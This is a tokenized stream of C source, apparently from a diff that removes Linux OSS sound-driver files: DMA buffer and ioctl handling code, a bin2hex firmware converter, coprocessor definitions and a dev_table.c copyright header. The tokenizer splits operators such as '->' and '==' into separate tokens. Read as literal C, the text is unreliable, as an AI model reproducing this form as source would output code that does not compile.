"spin_lock_irqsave", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Compute", "number", "of", "bytes", "that", "have", "been", "played", "*", "/", "count", "=", "DMAbuf_get_buffer_pointer", "(", "dev", ",", "dmap", ",", "DMODE_OUTPUT", ")", ";", "if", "(", "count", "<", "dmap", "-", ">", "fragment_size", "&", "&", "dmap", "-", ">", "qhead", "!", "=", "0", ")", "count", "+", "=", "dmap", "-", ">", "bytes_in_use", ";", "/", "*", "Pointer", "wrap", "not", "handled", "yet", "*", "/", "count", "+", "=", "dmap", "-", ">", "byte_counter", ";", "/", "*", "Subtract", "current", "count", "from", "the", "number", "of", "bytes", "written", "by", "app", "*", "/", "count", "=", "dmap", "-", ">", "user_counter", "-", "count", ";", "if", "(", "count", "<", "0", ")", "count", "=", "0", ";", "spin_unlock_irqrestore", "(", "&", "dmap", "-", ">", "lock", ",", "flags", ")", ";", "val", "=", "count", ";", "break", ";", "default", ":", "return", "dma_ioctl", "(", "dev", ",", "cmd", ",", "arg", ")", ";", "}", "return", "put_user", "(", "val", ",", "p", ")", ";", "}", "void", "audio_init_devices", "(", "void", ")", "{", "/", "*", "*", "NOTE", "!", "This", "routine", "could", "be", "called", "several", "times", "during", "boot", ".", "*", "/", "}", "void", "reorganize_buffers", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ",", "int", "recording", ")", "{", "/", "*", "*", "This", "routine", "breaks", "the", "physical", "device", "buffers", "to", "logical", "ones", ".", "*", "/", "struct", "audio_operations", "*", "dsp_dev", "=", "audio_devs", "[", "dev", "]", ";", "unsigned", "i", ",", "n", ";", "unsigned", "sr", ",", "nc", ",", "sz", ",", "bsz", ";", "sr", "=", "dsp_dev", "-", ">", "d", "-", ">", "set_speed", "(", "dev", ",", "0", ")", ";", "nc", "=", "dsp_dev", "-", ">", "d", "-", ">", "set_channels", "(", "dev", ",", "0", ")", ";", "sz", "=", "dsp_dev", "-", ">", "d", "-", ">", "set_bits", "(", "dev", ",", "0", ")", ";", "if", "(", "sz", "=", "=", "8", ")", "dmap", "-", ">", "neutral_byte", "=", "NEUTRAL8", ";", "else", "dmap", "-", ">", "neutral_byte", "=", "NEUTRAL16", ";", "if", "(", "sr", "<", "1", "|", "|", "nc", "<", "1", "|", "|", "sz", "<", "1", ")", "{", "/", "*", "printk", "(", "KERN_DEBUG", "\"", "Warning", ":", "Invalid", "PCM", "parameters", "[", "%", "d", "]", "sr", "=", "%", "d", ",", "nc", "=", "%", "d", ",", "sz", "=", "%", "d", "\\", "n", "\"", ",", "dev", ",", "sr", ",", "nc", ",", "sz", ")", ";*", "/", "sr", "=", "DSP_DEFAULT_SPEED", ";", "nc", "=", "1", ";", "sz", "=", "8", ";", "}", "sz", "=", "sr", "*", "nc", "*", "sz", ";", "sz", "/", "=", "8", ";", "/", "*", "#", "bits", "-", ">", "#", "bytes", "*", "/", "dmap", "-", ">", "data_rate", "=", "sz", ";", "if", "(", "!", "dmap", "-", ">", "needs_reorg", ")", "return", ";", "dmap", "-", ">", "needs_reorg", "=", "0", ";", "if", "(", "dmap", "-", ">", "fragment_size", "=", "=", "0", ")", "{", "/", "*", "Compute", "the", "fragment", "size", "using", "the", "default", "algorithm", "*", "/", "/", "*", "*", "Compute", "a", "buffer", "size", "for", "time", "not", "exceeding", "1", "second", ".", "*", "Usually", "this", "algorithm", "gives", "a", "buffer", "size", "for", "0", ".", "5", "to", "1", ".", "0", "seconds", "*", "of", "sound", "(", "using", "the", "current", "speed", ",", "sample", "size", "and", "#", "channels", ")", ".", "*", "/", "bsz", "=", "dmap", "-", ">", "buffsize", ";", "while", "(", "bsz", ">", "sz", ")", "bsz", "/", "=", "2", ";", "if", "(", "bsz", "=", "=", "dmap", "-", ">", "buffsize", ")", "bsz", "/", "=", "2", ";", "/", "*", "Needs", "at", "least", "2", "buffers", "*", "/", "/", "*", "*", "Split", "the", "computed", "fragment", "to", "smaller", "parts", ".", "After", "3", ".", "5a9", "*", "the", "default", "subdivision", "is", "4", "which", "should", "give", "better", "*", "results", "when", "recording", ".", "*", "/", "if", "(", "dmap", "-", ">", "subdivision", "=", "=", "0", ")", "/", "*", "Not", "already", "set", "*", "/", "{", "dmap", "-", ">", "subdivision", "=", "4", ";", "/", "*", "Init", "to", "the", "default", "value", "*", "/", "if", "(", "(", "bsz", "/", "dmap", "-", ">", "subdivision", ")", ">", "4096", ")", "dmap", "-", ">", "subdivision", "*", "=", "2", ";", "if", "(", "(", "bsz", "/", "dmap", "-", ">", "subdivision", ")", "<", "4096", ")", "dmap", "-", ">", "subdivision", "=", "1", ";", "}", "bsz", "/", "=", "dmap", "-", ">", "subdivision", ";", "if", "(", "bsz", "<", "16", ")", "bsz", "=", "16", ";", "/", "*", "Just", "a", "sanity", "check", "*", "/", "dmap", "-", ">", "fragment_size", "=", "bsz", ";", "}", "else", "{", "/", "*", "*", "The", "process", "has", "specified", "the", "buffer", "size", "with", "SNDCTL_DSP_SETFRAGMENT", "or", "*", "the", "buffer", "size", "computation", "has", "already", "been", "done", ".", "*", "/", "if", "(", "dmap", "-", ">", "fragment_size", ">", "(", "dmap", "-", ">", "buffsize", "/", "2", ")", ")", "dmap", "-", ">", "fragment_size", "=", "(", "dmap", "-", ">", "buffsize", "/", "2", ")", ";", "bsz", "=", "dmap", "-", ">", "fragment_size", ";", "}", "if", "(", "audio_devs", "[", "dev", "]", "->", "min_fragment", ")", "if", "(", "bsz", "<", "(", "1", "<", "<", "audio_devs", "[", "dev", "]", "->", "min_fragment", ")", ")", "bsz", "=", "1", "<", "<", "audio_devs", "[", "dev", "]", "->", "min_fragment", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "max_fragment", ")", "if", "(", "bsz", ">", "(", "1", "<", "<", "audio_devs", "[", "dev", "]", "->", "max_fragment", ")", ")", "bsz", "=", "1", "<", "<", "audio_devs", "[", "dev", "]", "->", "max_fragment", ";", "bsz", "&", "=", "~", "0x07", ";", "/", "*", "Force", "size", "which", "is", "multiple", "of", "8", "bytes", "*", "/", "#", "ifdef", "OS_DMA_ALIGN_CHECK", "OS_DMA_ALIGN_CHECK", "(", "bsz", ")", ";", "#", "endif", "n", "=", "dmap", "-", ">", "buffsize", "/", "bsz", ";", "if", "(", "n", ">", "MAX_SUB_BUFFERS", ")", "n", "=", "MAX_SUB_BUFFERS", ";", "if", "(", "n", ">", "dmap", "-", ">", "max_fragments", ")", "n", "=", "dmap", "-", ">", "max_fragments", ";", "if", "(", "n", "<", "2", ")", "{", "n", "=", "2", ";", "bsz", "/", "=", "2", ";", "}", "dmap", "-", ">", "nbufs", "=", "n", ";", "dmap", "-", ">", "bytes_in_use", "=", "n", "*", "bsz", ";", "dmap", "-", ">", "fragment_size", "=", "bsz", ";", "dmap", "-", ">", "max_byte_counter", "=", "(", "dmap", "-", ">", "data_rate", "*", "60", "*", "60", ")", "+", "dmap", "-", ">", "bytes_in_use", ";", "/", "*", "Approximately", "one", "hour", "*", "/", "if", "(", "dmap", "-", ">", "raw_buf", ")", "{", "memset", "(", "dmap", "-", ">", "raw_buf", ",", "dmap", "-", ">", "neutral_byte", ",", "dmap", "-", ">", "bytes_in_use", ")", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "dmap", "-", ">", "nbufs", ";", "i", "+", "+)", "{", "dmap", "-", ">", "counts", "[", "i", "]", "=", "0", ";", "}", "dmap", "-", ">", "flags", "|", "=", "DMA_ALLOC_DONE", "|", "DMA_EMPTY", ";", "}", "static", "int", "dma_subdivide", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ",", "int", "fact", ")", "{", "if", "(", "fact", "=", "=", "0", ")", "{", "fact", "=", "dmap", "-", ">", "subdivision", ";", "if", "(", "fact", "=", "=", "0", ")", "fact", "=", "1", ";", "return", "fact", ";", "}", "if", "(", "dmap", "-", ">", "subdivision", "!", "=", "0", "|", "|", "dmap", "-", ">", "fragment_size", ")", "/", "*", "Too", "late", "to", "change", "*", "/", "return", "-", "EINVAL", ";", "if", "(", "fact", ">", "MAX_REALTIME_FACTOR", ")", "return", "-", "EINVAL", ";", "if", "(", "fact", "!", "=", "1", "&", "&", "fact", "!", "=", "2", "&", "&", "fact", "!", "=", "4", "&", "&", "fact", "!", "=", "8", "&", "&", "fact", "!", "=", "16", ")", "return", "-", "EINVAL", ";", "dmap", "-", ">", "subdivision", "=", "fact", ";", "return", "fact", ";", "}", "static", "int", "dma_set_fragment", "(", "int", "dev", ",", "struct", "dma_buffparms", "*", "dmap", ",", "int", "fact", ")", "{", "int", "bytes", ",", "count", ";", "if", "(", "fact", "=", "=", "0", ")", "return", "-", "EIO", ";", "if", "(", "dmap", "-", ">", "subdivision", "!", "=", "0", "|", "|", "dmap", "-", ">", "fragment_size", ")", "/", "*", "Too", "late", "to", "change", "*", "/", "return", "-", "EINVAL", ";", "bytes", "=", "fact", "&", "0xffff", ";", "count", "=", "(", "fact", ">", ">", "16", ")", "&", "0x7fff", ";", "if", "(", "count", "=", "=", "0", ")", "count", "=", "MAX_SUB_BUFFERS", ";", "else", "if", "(", "count", "<", "MAX_SUB_BUFFERS", ")", "count", "+", "+;", "if", "(", "bytes", "<", "4", "|", "|", "bytes", ">", "17", ")", "/", "*", "<", "16", "|", "|", ">", "512k", "*", "/", "return", "-", "EINVAL", ";", "if", "(", "count", "<", "2", ")", "return", "-", "EINVAL", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "min_fragment", ">", "0", ")", "if", "(", "bytes", "<", "audio_devs", "[", "dev", "]", "->", "min_fragment", ")", "bytes", "=", "audio_devs", "[", "dev", "]", "->", "min_fragment", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "max_fragment", ">", "0", ")", "if", "(", "bytes", ">", "audio_devs", "[", "dev", "]", "->", "max_fragment", ")", "bytes", "=", "audio_devs", "[", "dev", "]", "->", "max_fragment", ";", "#", "ifdef", "OS_DMA_MINBITS", "if", "(", "bytes", "<", "OS_DMA_MINBITS", ")", "bytes", "=", "OS_DMA_MINBITS", ";", "#", "endif", "dmap", "-", ">", "fragment_size", "=", "(", "1", "<", "<", "bytes", ")", ";", "dmap", "-", ">", "max_fragments", "=", "count", ";", "if", "(", "dmap", "-", ">", "fragment_size", ">", "dmap", "-", ">", "buffsize", ")", "dmap", "-", ">", "fragment_size", "=", "dmap", "-", ">", "buffsize", ";", "if", "(", "dmap", "-", ">", "fragment_size", "=", "=", "dmap", "-", ">", "buffsize", "&", "&", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_AUTOMODE", ")", "dmap", "-", ">", "fragment_size", "/", "=", "2", ";", "/", "*", "Needs", "at", "least", "2", "buffers", "*", "/", "dmap", "-", ">", "subdivision", "=", "1", ";", "/", "*", "Disable", "SNDCTL_DSP_SUBDIVIDE", "*", "/", "return", "bytes", "|", "(", "(", "count", "-", "1", ")", "<", "<", "16", ")", ";", "}", "static", "int", "dma_ioctl", "(", "int", "dev", ",", "unsigned", "int", "cmd", ",", "void", "__user", "*", "arg", ")", "{", "struct", "dma_buffparms", "*", "dmap_out", "=", "audio_devs", "[", "dev", "]", "->", "dmap_out", ";", "struct", "dma_buffparms", "*", "dmap_in", "=", "audio_devs", "[", "dev", "]", "->", "dmap_in", ";", "struct", "dma_buffparms", "*", "dmap", ";", "audio_buf_info", "info", ";", "count_info", "cinfo", ";", "int", "fact", ",", "ret", ",", "changed", ",", "bits", ",", "count", ",", "err", ";", "unsigned", "long", "flags", ";", "switch", "(", "cmd", ")", "{", "case", "SNDCTL_DSP_SUBDIVIDE", ":", "ret", "=", "0", ";", "if", "(", "get_user", "(", "fact", ",", "(", "int", "__user", "*", ")", "arg", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", "ret", "=", "dma_subdivide", "(", "dev", ",", "dmap_out", ",", "fact", ")", ";", "if", "(", "ret", "<", "0", ")", "return", "ret", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "!", "=", "OPEN_WRITE", "|", "|", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", "&", "&", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", ")", "ret", "=", "dma_subdivide", "(", "dev", ",", "dmap_in", ",", "fact", ")", ";", "if", "(", "ret", "<", "0", ")", "return", "ret", ";", "break", ";", "case", "SNDCTL_DSP_GETISPACE", ":", "case", "SNDCTL_DSP_GETOSPACE", ":", "dmap", "=", "dmap_out", ";", "if", "(", "cmd", "=", "=", "SNDCTL_DSP_GETISPACE", "&", "&", "!", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", ")", "return", "-", "EINVAL", ";", "if", "(", "cmd", "=", "=", "SNDCTL_DSP_GETOSPACE", "&", "&", "!", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "-", "EINVAL", ";", "if", "(", "cmd", "=", "=", "SNDCTL_DSP_GETISPACE", "&", "&", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", ")", "dmap", "=", "dmap_in", ";", "if", "(", "dmap", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "return", "-", "EINVAL", ";", "if", "(", "!(", "dmap", "-", ">", "flags", "&", "DMA_ALLOC_DONE", ")", ")", "reorganize_buffers", "(", "dev", ",", "dmap", ",", "(", "cmd", "=", "=", "SNDCTL_DSP_GETISPACE", ")", ");", "info", ".", "fragstotal", "=", "dmap", "-", ">", "nbufs", ";", "if", "(", "cmd", "=", "=", "SNDCTL_DSP_GETISPACE", ")", "info", ".", "fragments", "=", "dmap", "-", ">", "qlen", ";", "else", "{", "if", "(", "!", "DMAbuf_space_in_queue", "(", "dev", ")", ")", "info", ".", "fragments", "=", "0", ";", "else", "{", "info", ".", "fragments", "=", "DMAbuf_space_in_queue", "(", "dev", ")", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "local_qlen", ")", "{", "int", "tmp", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "local_qlen", "(", "dev", ")", ";", "if", "(", "tmp", "&", "&", "info", ".", "fragments", ")", "tmp", "-", "-;", "/", "*", "*", "This", "buffer", "has", "been", "counted", "twice", "*", "/", "info", ".", "fragments", "-", "=", "tmp", ";", "}", "}", "}", "if", "(", "info", ".", "fragments", "<", "0", ")", "info", ".", "fragments", "=", "0", ";", "else", "if", "(", "info", ".", "fragments", ">", "dmap", "-", ">", "nbufs", ")", "info", ".", "fragments", "=", "dmap", "-", ">", "nbufs", ";", "info", ".", "fragsize", "=", "dmap", "-", ">", "fragment_size", ";", "info", ".", "bytes", "=", "info", ".", "fragments", "*", "dmap", "-", ">", "fragment_size", ";", "if", "(", "cmd", "=", "=", "SNDCTL_DSP_GETISPACE", "&", "&", "dmap", "-", ">", "qlen", ")", "info", ".", "bytes", "-", "=", "dmap", "-", ">", "counts", "[", "dmap", "-", ">", "qhead", "]", ";", "else", "{", "info", ".", "fragments", "=", "info", ".", "bytes", "/", "dmap", "-", ">", "fragment_size", ";", "info", ".", "bytes", "-", "=", "dmap", "-", ">", "user_counter", "%", "dmap", "-", ">", "fragment_size", ";", "}", "if", "(", "copy_to_user", "(", "arg", ",", "&", "info", ",", "sizeof", "(", "info", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_DSP_SETTRIGGER", ":", "if", "(", "get_user", "(", "bits", ",", "(", "int", "__user", "*", ")", "arg", ")", ")", "return", "-", "EFAULT", ";", "bits", "&", "=", "audio_devs", "[", "dev", "]", "->", "open_mode", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "trigger", "=", "=", "NULL", ")", "return", "-", "EINVAL", ";", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", ")", "&", "&", "(", "bits", "&", "PCM_ENABLE_INPUT", ")", "&", "&", "(", "bits", "&", "PCM_ENABLE_OUTPUT", ")", ")", "return", "-", "EINVAL", ";", "if", "(", "bits", "&", "PCM_ENABLE_INPUT", ")", "{", "spin_lock_irqsave", "(", "&", "dmap_in", "-", ">", "lock", ",", "flags", ")", ";", "changed", "=", "(", "audio_devs", "[", "dev", "]", "->", "enable_bits", "^", "bits", ")", "&", "PCM_ENABLE_INPUT", ";", "if", "(", "changed", "&", "&", "audio_devs", "[", "dev", "]", "->", "go", ")", "{", "reorganize_buffers", "(", "dev", ",", "dmap_in", ",", "1", ")", ";", "if", "(", "(", "err", "=", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "prepare_for_input", "(", "dev", ",", "dmap_in", "-", ">", "fragment_size", ",", "dmap_in", "-", ">", "nbufs", ")", ")", "<", "0", ")", "{", "spin_unlock_irqrestore", "(", "&", "dmap_in", "-", ">", "lock", ",", "flags", ")", ";", "return", "err", ";", "}", "dmap_in", "-", ">", "dma_mode", "=", "DMODE_INPUT", ";", "audio_devs", "[", "dev", "]", "->", "enable_bits", "|", "=", "PCM_ENABLE_INPUT", ";", "DMAbuf_activate_recording", "(", "dev", ",", "dmap_in", ")", ";", "}", "else", "audio_devs", "[", "dev", "]", "->", "enable_bits", "&", "=", "~", "PCM_ENABLE_INPUT", ";", "spin_unlock_irqrestore", "(", "&", "dmap_in", "-", ">", "lock", ",", "flags", ")", ";", "}", "if", "(", "bits", "&", "PCM_ENABLE_OUTPUT", ")", "{", "spin_lock_irqsave", "(", "&", "dmap_out", "-", ">", "lock", ",", "flags", ")", ";", "changed", "=", "(", "audio_devs", "[", "dev", "]", "->", "enable_bits", "^", "bits", ")", "&", "PCM_ENABLE_OUTPUT", ";", "if", "(", "changed", "&", "&", "(", "dmap_out", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", "|", "|", "dmap_out", "-", ">", "qlen", ">", "0", ")", "&", "&", "audio_devs", "[", "dev", "]", "->", "go", ")", "{", "if", "(", "!(", "dmap_out", "-", ">", "flags", "&", "DMA_ALLOC_DONE", ")", ")", "reorganize_buffers", "(", "dev", ",", "dmap_out", ",", "0", ")", ";", "dmap_out", "-", ">", "dma_mode", "=", "DMODE_OUTPUT", ";", "audio_devs", "[", "dev", "]", "->", "enable_bits", "|", "=", "PCM_ENABLE_OUTPUT", ";", "dmap_out", "-", ">", "counts", "[", "dmap_out", "-", ">", "qhead", "]", "=", "dmap_out", "-", ">", "fragment_size", ";", "DMAbuf_launch_output", "(", "dev", ",", "dmap_out", ")", ";", "}", "else", "audio_devs", "[", "dev", "]", "->", "enable_bits", "&", "=", "~", "PCM_ENABLE_OUTPUT", ";", "spin_unlock_irqrestore", "(", "&", "dmap_out", "-", ">", "lock", ",", "flags", ")", ";", "}", "#", "if", "0", "if", "(", "changed", "&", "&", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "trigger", ")", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "trigger", "(", "dev", ",", "bits", "*", "audio_devs", "[", "dev", "]", "->", "go", ")", ";", "#", "endif", "/", "*", "Falls", "through", ".", "..", "*", "/", "case", "SNDCTL_DSP_GETTRIGGER", ":", "ret", "=", "audio_devs", "[", "dev", "]", "->", "enable_bits", ";", "break", ";", "case", "SNDCTL_DSP_SETSYNCRO", ":", "if", "(", "!", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "trigger", ")", "return", "-", "EINVAL", ";", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "trigger", "(", "dev", ",", "0", ")", ";", "audio_devs", "[", "dev", "]", "->", "go", "=", "0", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETIPTR", ":", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", ")", "return", "-", "EINVAL", ";", "spin_lock_irqsave", "(", "&", "dmap_in", "-", ">", "lock", ",", "flags", ")", ";", "cinfo", ".", "bytes", "=", "dmap_in", "-", ">", "byte_counter", ";", "cinfo", ".", "ptr", "=", "DMAbuf_get_buffer_pointer", "(", "dev", ",", "dmap_in", ",", "DMODE_INPUT", ")", "&", "~", "3", ";", "if", "(", "cinfo", ".", "ptr", "<", "dmap_in", "-", ">", "fragment_size", "&", "&", "dmap_in", "-", ">", "qtail", "!", "=", "0", ")", "cinfo", ".", "bytes", "+", "=", "dmap_in", "-", ">", "bytes_in_use", ";", "/", "*", "Pointer", "wrap", "not", "handled", "yet", "*", "/", "cinfo", ".", "blocks", "=", "dmap_in", "-", ">", "qlen", ";", "cinfo", ".", "bytes", "+", "=", "cinfo", ".", "ptr", ";", "if", "(", "dmap_in", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "dmap_in", "-", ">", "qlen", "=", "0", ";", "/", "*", "Reset", "interrupt", "counter", "*", "/", "spin_unlock_irqrestore", "(", "&", "dmap_in", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "copy_to_user", "(", "arg", ",", "&", "cinfo", ",", "sizeof", "(", "cinfo", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETOPTR", ":", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "-", "EINVAL", ";", "spin_lock_irqsave", "(", "&", "dmap_out", "-", ">", "lock", ",", "flags", ")", ";", "cinfo", ".", "bytes", "=", "dmap_out", "-", ">", "byte_counter", ";", "cinfo", ".", "ptr", "=", "DMAbuf_get_buffer_pointer", "(", "dev", ",", "dmap_out", ",", "DMODE_OUTPUT", ")", "&", "~", "3", ";", "if", "(", "cinfo", ".", "ptr", "<", "dmap_out", "-", ">", "fragment_size", "&", "&", "dmap_out", "-", ">", "qhead", "!", "=", "0", ")", "cinfo", ".", "bytes", "+", "=", "dmap_out", "-", ">", "bytes_in_use", ";", "/", "*", "Pointer", "wrap", "not", "handled", "yet", "*", "/", "cinfo", ".", "blocks", "=", "dmap_out", "-", ">", "qlen", ";", "cinfo", ".", "bytes", "+", "=", "cinfo", ".", "ptr", ";", "if", "(", "dmap_out", "-", ">", "mapping_flags", "&", "DMA_MAP_MAPPED", ")", "dmap_out", "-", ">", "qlen", "=", "0", ";", "/", "*", "Reset", "interrupt", "counter", "*", "/", "spin_unlock_irqrestore", "(", "&", "dmap_out", "-", ">", "lock", ",", "flags", ")", ";", "if", "(", "copy_to_user", "(", "arg", ",", "&", "cinfo", ",", "sizeof", "(", "cinfo", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETODELAY", ":", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", ")", "return", "-", "EINVAL", ";", "if", "(", "!(", "dmap_out", "-", ">", "flags", "&", "DMA_ALLOC_DONE", ")", ")", "{", "ret", "=", "0", ";", "break", ";", "}", "spin_lock_irqsave", "(", "&", "dmap_out", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Compute", "number", "of", "bytes", "that", "have", "been", "played", "*", "/", "count", "=", "DMAbuf_get_buffer_pointer", "(", "dev", ",", "dmap_out", ",", "DMODE_OUTPUT", ")", ";", "if", "(", "count", "<", "dmap_out", "-", ">", "fragment_size", "&", "&", "dmap_out", "-", ">", "qhead", "!", "=", "0", ")", "count", "+", "=", "dmap_out", "-", ">", "bytes_in_use", ";", "/", "*", "Pointer", "wrap", "not", "handled", "yet", "*", "/", "count", "+", "=", "dmap_out", "-", ">", "byte_counter", ";", "/", "*", "Subtract", "current", "count", "from", "the", "number", "of", "bytes", "written", "by", "app", "*", "/", "count", "=", "dmap_out", "-", ">", "user_counter", "-", "count", ";", "if", "(", "count", "<", "0", ")", "count", "=", "0", ";", "spin_unlock_irqrestore", "(", "&", "dmap_out", "-", ">", "lock", ",", "flags", ")", ";", "ret", "=", "count", ";", "break", ";", "case", "SNDCTL_DSP_POST", ":", "if", "(", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "qlen", ">", "0", ")", "if", "(", "!(", "audio_devs", "[", "dev", "]", "->", "dmap_out", "-", ">", "flags", "&", "DMA_ACTIVE", ")", ")", "DMAbuf_launch_output", "(", "dev", ",", "audio_devs", "[", "dev", "]", "->", "dmap_out", ")", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETBLKSIZE", ":", "dmap", "=", "dmap_out", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", "reorganize_buffers", "(", "dev", ",", "dmap_out", ",", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "=", "=", "OPEN_READ", ")", ");", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "=", "=", "OPEN_READ", "|", "|", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", "&", "&", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", ")", "reorganize_buffers", "(", "dev", ",", "dmap_in", ",", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "=", "=", "OPEN_READ", ")", ");", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "=", "=", "OPEN_READ", ")", "dmap", "=", "dmap_in", ";", "ret", "=", "dmap", "-", ">", "fragment_size", ";", "break", ";", "case", "SNDCTL_DSP_SETFRAGMENT", ":", "ret", "=", "0", ";", "if", "(", "get_user", "(", "fact", ",", "(", "int", "__user", "*", ")", "arg", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_WRITE", ")", "ret", "=", "dma_set_fragment", "(", "dev", ",", "dmap_out", ",", "fact", ")", ";", "if", "(", "ret", "<", "0", ")", "return", "ret", ";", "if", "(", "audio_devs", "[", "dev", "]", "->", "open_mode", "=", "=", "OPEN_READ", "|", "|", "(", "audio_devs", "[", "dev", "]", "->", "flags", "&", "DMA_DUPLEX", "&", "&", "audio_devs", "[", "dev", "]", "->", "open_mode", "&", "OPEN_READ", ")", ")", "ret", "=", "dma_set_fragment", "(", "dev", ",", "dmap_in", ",", "fact", ")", ";", "if", "(", "ret", "<", "0", ")", "return", "ret", ";", "if", "(", "!", "arg", ")", "/", "*", "don", "'", "t", "know", "what", "this", "is", "good", "for", ",", "but", "preserve", "old", "semantics", "*", "/", "return", "0", ";", "break", ";", "default", ":", "if", "(", "!", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "ioctl", ")", "return", "-", "EINVAL", ";", "return", "audio_devs", "[", "dev", "]", "->", "d", "-", ">", "ioctl", "(", "dev", ",", "cmd", ",", "arg", ")", ";", "}", "return", "put_user", "(", "ret", ",", "(", "int", "__user", "*", ")", "arg", ")", ";", "}", "@", "@", "-", "1", ",", "39", "+", "0", ",", "0", "@", "@", "#", "include", "<", "stdio", ".", "h", ">", "#", "include", "<", "string", ".", "h", ">", "#", "include", "<", "stdlib", ".", "h", ">", "int", "main", "(", "int", "argc", ",", "const", "char", "*", "argv", "[", "]", ")", "{", "const", "char", "*", "varname", ";", "int", "i", "=", "0", ";", "int", "c", ";", "int", "id", "=", "0", ";", "if", "(", "argv", "[", "1", "]", "&", "&", "strcmp", "(", "argv", "[", "1", "]", ",\"", "-", "i", "\"", ")=", "=", "0", ")", "{", "argv", "+", "+;", "argc", "-", "-;", "id", "=", "1", ";", "}", "if", "(", "argc", "=", "=", "1", ")", "{", "fprintf", "(", "stderr", ",", "\"", "bin2hex", ":", "[", "-", "i", "]", "firmware", "\\", "n", "\"", ");", "exit", "(", "1", ")", ";", "}", "varname", "=", "argv", "[", "1", "]", ";", "printf", "(", "\"", "/*", "automatically", "generated", "by", "bin2hex", "*", "/\\", "n", "\"", ")", ";", "printf", "(", "\"", "static", "unsigned", "char", "%", "s", "[", "]", "%", "s", "=", "\\", "n", "{", "\\", "n", "\"", ",", "varname", ",", "id", "?", "\"", "__initdata", "\"", ":\"", "\")", ";", "while", "(", "(", "c", "=", "getchar", "(", ")", ")", "!", "=", "EOF", ")", "{", "if", "(", "i", "!", "=", "0", "&", "&", "i", "%", "10", "=", "=", "0", ")", "printf", "(", "\"", "\\", "n", "\"", ")", ";", "printf", "(", "\"", "0x", "%", "02lx", ",", "\",", "c", "&", "0xFFl", ")", ";", "i", "+", "+;", "}", "printf", "(", "\"", "};", "\\", "nstatic", "int", "%", "sLen", "=", "%", "d", ";", "\\", "n", "\"", ",", "varname", ",", "i", ")", ";", "return", "0", ";", "}", "@", "@", "-", "1", ",", "12", "+", "0", ",", "0", "@", "@", "/", "*", "*", "Definitions", "for", "various", "on", "board", "processors", "on", "the", "sound", "cards", ".", "For", "*", "example", "DSP", "processors", ".", "*", "/", "/", "*", "*", "Coprocessor", "access", "types", "*", "/", "#", "define", "COPR_CUSTOM", "0x0001", "/", "*", "Custom", "applications", "*", "/", "#", "define", "COPR_MIDI", "0x0002", "/", "*", "MIDI", "(", "MPU", "-", "401", ")", "emulation", "*", "/", "#", "define", "COPR_PCM", "0x0004", "/", "*", "Digitized", "voice", "applications", "*", "/", "#", "define", "COPR_SYNTH", "0x0008", "/", "*", "Music", "synthesis", "*", "/", "@", "@", "-", "1", ",", "256", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "dev_table", ".", "c", "*", "*", "Device", "call", "tables", ".", "*", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", 